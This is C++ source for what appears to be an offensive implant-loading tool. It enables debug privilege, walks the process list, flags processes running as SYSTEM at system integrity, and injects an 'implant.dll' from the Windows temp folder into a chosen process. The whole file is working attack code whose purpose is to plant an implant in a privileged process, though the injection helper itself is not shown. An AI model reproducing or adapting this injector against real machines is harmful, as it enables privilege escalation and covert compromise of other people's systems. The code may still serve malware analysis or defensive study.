#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include "util.hpp"
#include "injector.hpp"

//PCWSTR dllPath = L"C:\\Users\\speep\\Source\\repos\\408T_implant\\x64\\Release\\implant.dll";
PCWSTR dllPath = L"C:\\Windows\\Temp\\implant.dll";

int main(int argc, char *argv[])
{
    util::SetSeDebugPrivilege();

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &procEntry)) 
    {
        do 
        {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procEntry.th32ProcessID);
            if (hProcess)
            {
                char procName[MAX_PATH];
                char integrityLevel[MAX_PATH];
                char username[MAX_PATH];
                ProcInfo procInfo = injector::GetProcInfo(hProcess);

                size_t dude = 0;
                wcstombs_s(&dude, procName, sizeof(procName), procEntry.szExeFile, _TRUNCATE);
                wcstombs_s(&dude, integrityLevel, sizeof(integrityLevel), procInfo.integrityLevel.c_str(), _TRUNCATE);
                wcstombs_s(&dude, username, sizeof(username), procInfo.username.c_str(), _TRUNCATE);

                if ((procInfo.flags & (INTEGRITY_SYSTEM | USER_SYSTEM)) == GOAT_STATUS)
                    info("[%lu]: %s %s %s, %d", procEntry.th32ProcessID, procName, username, integrityLevel, procInfo.flags);

                //if (!strcmp(procName, "notepad.exe")) {
                if (procEntry.th32ProcessID == atoi(argv[1]))
                {
                    std::wstring fmtParams = std::wstring(procEntry.szExeFile) + L" " 
                                           + procInfo.integrityLevel + L" " 
                                           + procInfo.username;
                    injector::InjectDLL(procEntry.th32ProcessID, dllPath, NULL);
                                                                        // LOL
                }
            }
        } while (Process32Next(hSnap, &procEntry));
    }
    CloseHandle(hSnap);
    return 0;
}
